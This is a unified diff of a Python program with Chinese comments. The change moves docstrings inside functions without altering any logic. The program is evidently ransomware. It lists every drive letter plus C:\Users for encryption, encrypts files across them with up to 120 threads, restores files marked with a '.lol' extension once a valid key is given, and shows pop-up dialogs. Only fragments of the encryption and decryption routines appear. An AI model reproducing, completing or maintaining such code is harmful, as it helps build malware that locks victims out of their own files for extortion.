@@ -33,13 +33,13 @@ g_max_thread = 120
 g_flag_key_valid = False
 
 
-"""
-弹窗提醒
-@param type: 
-	1 - 弹出一个错误对话框
-	2 - 弹出一个普通的信息提示框
-"""
 def CallMsgBox(type, title, content):
+	"""
+	弹窗提醒
+	@param type: 
+		1 - 弹出一个错误对话框
+		2 - 弹出一个普通的信息提示框
+	"""
 	# 创建一个根窗口
 	WINDOW = tkinter.Tk()
 	# 将根窗口隐藏起来
@@ -55,11 +55,11 @@ def CallMsgBox(type, title, content):
 	WINDOW.destroy()
 
 
-"""
-返回一个列表，包含了将要加密的硬盘分区有哪些
-对于 C 盘，只加密 C:/Users/ 里面的文件，其他的目录都跳过
-"""
 def CreatePathList():
+	"""
+	返回一个列表，包含了将要加密的硬盘分区有哪些
+	对于 C 盘，只加密 C:/Users/ 里面的文件，其他的目录都跳过
+	"""
 	li = [r"c:\Users\\"]
 	for latter in range(97,123):
 		li.append(f"{chr(latter)}:\\")
@@ -67,8 +67,10 @@ def CreatePathList():
 	return li
 
 
-"""对单个文件执行加密工作"""
 def PerformEncryption(file_path, file_name, secret_box):
+	"""
+	对单个文件执行加密工作
+	"""
 	global g_type_skip
 
 	# 跳过一些指定的文件格式
@@ -89,8 +91,10 @@ def PerformEncryption(file_path, file_name, secret_box):
 	except: pass
 
 
-"""对单个文件执行解密工作"""
 def PerformDecryption(file_path, file_name, secret_box):
+	"""
+	对单个文件执行解密工作
+	"""
 	global g_flag_key_valid
 
 	if ".lol" in file_name:
@@ -111,13 +115,13 @@ def PerformDecryption(file_path, file_name, secret_box):
 		except: pass
 
 
-"""
-判断一个文件是否应该被加密或解密，以及是否需要创建线程
-@param en_de_flag: 
-	1 - 表示进行加密
-	2 - 表示进行解密
-"""
 def En_De_cryptFile(en_de_flag, key_val):
+	"""
+	判断一个文件是否应该被加密或解密，以及是否需要创建线程
+	@param en_de_flag: 
+		1 - 表示进行加密
+		2 - 表示进行解密
+	"""
 	global g_dir_skip, g_max_thread
 	# 记录创建过的线程
 	thr_obj = None
